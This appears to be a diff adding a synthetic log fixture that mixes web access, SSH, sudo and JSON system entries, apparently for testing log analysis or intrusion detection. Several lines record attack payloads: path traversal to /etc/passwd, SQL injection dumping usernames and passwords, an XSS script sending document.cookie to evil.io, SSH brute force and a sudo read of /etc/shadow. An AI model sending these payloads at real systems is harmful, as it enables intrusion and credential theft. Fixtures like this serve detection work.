@@ -1,0 +1,21 @@
+45.155.205.233 - - [02/Sep/2026:03:14:07 +0000] "GET /download?file=../../../../../etc/passwd HTTP/1.1" 403 210 "-" "Nikto/2.5.0"
+45.155.205.233 - - [02/Sep/2026:03:14:09 +0000] "GET /wp-admin/setup-config.php HTTP/1.1" 404 153 "-" "Nikto/2.5.0"
+45.155.205.233 - - [02/Sep/2026:03:14:11 +0000] "GET /.env HTTP/1.1" 404 153 "-" "Nikto/2.5.0"
+45.155.205.233 - - [02/Sep/2026:03:14:13 +0000] "GET /.git/config HTTP/1.1" 404 153 "-" "Nikto/2.5.0"
+45.155.205.233 - - [02/Sep/2026:03:14:15 +0000] "GET /phpmyadmin/index.php HTTP/1.1" 404 153 "-" "Nikto/2.5.0"
+45.155.205.233 - - [02/Sep/2026:03:14:17 +0000] "GET /api/v1/users?id=1 OR 1=1 HTTP/1.1" 200 4213 "-" "sqlmap/1.8"
+45.155.205.233 - - [02/Sep/2026:03:14:19 +0000] "GET /api/v1/search?q=1' UNION SELECT username,password FROM users-- HTTP/1.1" 200 8422 "-" "sqlmap/1.8"
+185.220.101.45 - - [02/Sep/2026:03:15:02 +0000] "GET /comment?text=<script>fetch('http://evil.io/?c='+document.cookie)</script> HTTP/1.1" 200 1122 "-" "python-requests/2.31.0"
+185.220.101.45 - - [02/Sep/2026:03:15:10 +0000] "POST /api/v1/reports/export HTTP/1.1" 200 7340012 "-" "python-requests/2.31.0"
+Jan  2 03:15:44 edge-01 sshd[2201]: Failed password for root from 91.240.118.172 port 41022 ssh2
+Jan  2 03:15:46 edge-01 sshd[2203]: Failed password for root from 91.240.118.172 port 41044 ssh2
+Jan  2 03:15:48 edge-01 sshd[2205]: Failed password for admin from 91.240.118.172 port 41066 ssh2
+Jan  2 03:15:50 edge-01 sshd[2207]: Failed password for oracle from 91.240.118.172 port 41088 ssh2
+Jan  2 03:15:52 edge-01 sshd[2209]: Failed password for ubuntu from 91.240.118.172 port 41100 ssh2
+Jan  2 03:15:54 edge-01 sshd[2211]: Failed password for test from 91.240.118.172 port 41122 ssh2
+Jan  2 03:16:20 web-prod-01 sudo:   bob : command not permitted ; TTY=pts/0 ; PWD=/etc ; USER=root ; COMMAND=/bin/cat /etc/shadow
+{"timestamp": "2026-09-02T03:17:12Z", "level": "critical", "message": "Virus found: EICAR test file quarantined from /tmp/scratch", "host": "web-prod-02", "category": "system"}
+{"timestamp": "2026-09-02T03:17:40Z", "level": "error", "message": "Out of memory: Kill process 8123 (java) score 931 or sacrifice child", "host": "api-prod-01", "category": "system"}
+10.0.0.22 - - [02/Sep/2026:03:18:01 +0000] "GET /dashboard HTTP/1.1" 200 6120 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0"
+10.0.0.22 - - [02/Sep/2026:03:18:15 +0000] "GET /api/v1/orders HTTP/1.1" 200 3421 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/126.0"
+{"timestamp": "2026-09-02T03:18:44Z", "level": "warning", "message": "Health check failed for payment-service after 3 retries", "host": "api-prod-01", "category": "application"}
